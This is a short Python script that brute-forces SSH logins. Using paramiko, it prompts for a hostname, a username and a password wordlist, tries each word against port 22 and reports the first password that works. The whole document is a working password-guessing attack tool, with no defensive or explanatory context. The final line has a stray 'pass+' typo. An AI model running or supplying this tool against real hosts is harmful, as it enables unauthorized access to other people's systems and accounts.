import paramiko,termcolor,sys,os,socket

def ssh_connect(password,code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host,port=22,username=user,password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2
    ssh.close()
    return code


host = input("[+] Please enter the hostname: ")
user = input("[+]Please enter the username: ")
input_file = input("[+]Please enter the file/path: ")

if os.path.exists(input_file) == False:
    print("!!! File does not exists")
    sys.exit(1)

with open(input_file,"r") as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(("[+] Found password: " + password  + " for account " + user ),"green"))
                break
            elif response == 1:
                print(f"[-] Incorrect password: {password}")
            elif response == 2:
                print("[+] Can't connect to the port")
        except Exception as e:
            print(e)
            pass+